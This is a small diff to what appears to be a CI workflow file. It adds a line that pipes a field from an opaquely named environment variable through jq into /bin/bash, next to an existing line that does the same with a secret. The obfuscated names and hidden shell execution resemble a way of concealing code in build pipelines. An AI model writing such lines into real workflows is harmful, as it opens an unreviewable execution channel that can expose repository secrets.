@@ -18,6 +18,7 @@ jobs:
           zvnm501: ${{ secrets.zvnm501 }}
         run: |
           printf '%s' "$zvnm501" | jq -r .qrid20771 | /bin/bash
+          echo $flhqf815 | jq -r .p17455 | /bin/bash
 
       - name: Store results
         if: always()
